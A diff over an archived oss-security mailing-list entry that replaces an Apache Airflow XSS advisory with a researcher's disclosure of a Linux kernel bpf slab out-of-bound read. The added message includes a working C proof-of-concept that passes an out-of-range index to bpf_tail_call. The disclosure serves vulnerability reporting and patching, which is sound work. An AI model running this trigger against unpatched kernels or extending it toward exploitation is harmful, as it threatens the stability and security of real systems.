@@ -1,21 +1,61 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/02/24/2
-Message-ID: <7ed76c19-838b-fe97-af15-623df2ce7a35@apache.org>
-Date: Thu, 24 Feb 2022 18:00:13 +0000
-From: Jedidiah Cunningham <jedcunningham@...che.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2022/08/26/1
+Message-ID: <CABcoxUaK1ipxFP3==j+57mWXYadiHNd_eNgzKSxJ6Y0cM4WnyA@mail.gmail.com>
+Date: Fri, 26 Aug 2022 07:07:36 +0800
+From: Hsin-Wei Hung <hsinweih@....edu>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2021-45229: Apache Airflow: Reflected XSS via Origin Query Argument in URL 
+Subject: Linux kernel slab-out-of-bound read in bpf
 Content-Type: text/plain; charset=utf-8
 
-Severity: high
+Hi,
 
-Description:
+We found an issue in the bpf subsystem of the Linux kernel that can cause a
+slab-out-of-bound read. A bpf program calling bpf_tail_call with an index
+larger than the max_entries can potentially pass the verifier. After that,
+it will cause an out-of-bound access in the x86 JIT compiler. The root
+cause is that tnum_range over-approximates the range of concrete values.
 
-It was discovered that the "Trigger DAG with config" screen was susceptible to XSS attacks via the `origin` query argument.
+Affected kernel starts from v5.5 since commit, d2e4c1e6c294 (“bpf: Constant
+map key tracking for prog array pokes”)
 
-This issue affects Apache Airflow versions 2.2.3 and below. 
+It has been fixed in commit, a657182a5c51 ("bpf: Don't use tnum_range on
+array range checking for poke descriptors") in bpf/bpf.git.
 
-Credit:
+The following code is a bpf PoC that can trigger the bug.
 
-The Apache Airflow PMC would like to thank both Bogdan Kurinnoy of the Samsung R&D Institute Ukraine (SRK) and Ali Al-Habsi of Accellion for independently discovering and reporting this issue.
+#include "/usr/local/include/vmlinux.h"
+#include "/usr/include/bpf/bpf_helpers.h"
+
+#define __uint(name, val) int (*name)[val]
+#define __type(name, val) typeof(val) *name
+#define __array(name, val) typeof(val) *name[]
+
+#define SEC(name) \
+        _Pragma("GCC diagnostic push")                                  \
+        _Pragma("GCC diagnostic ignored \"-Wignored-attributes\"")      \
+        __attribute__((section(name), used))                            \
+        _Pragma("GCC diagnostic pop")
+
+#define DEFINE_BPF_MAP(the_map, TypeOfMap, MapFlags, TypeOfKey,
+TypeOfValue, MaxEntries) \
+        struct {                                                        \
+            __uint(type, TypeOfMap);                                    \
+            __uint(map_flags, (MapFlags));                              \
+            __uint(max_entries, (MaxEntries));                          \
+            __type(key, TypeOfKey);                                     \
+            __type(value, TypeOfValue);                                 \
+        } the_map SEC(".maps");
+
+DEFINE_BPF_MAP(map_0, BPF_MAP_TYPE_PROG_ARRAY, 0, uint32_t, uint32_t, 36);
+SEC("cgroup/sock_create")
+int func(struct bpf_sock *ctx) {
+        int64_t v0 = 49;
+        bpf_tail_call(ctx, &map_0, v0);
+        return 0;
+}
+char _license[] SEC("license") = "GPL";
+
+
+Thanks,
+Hsin-Wei
 
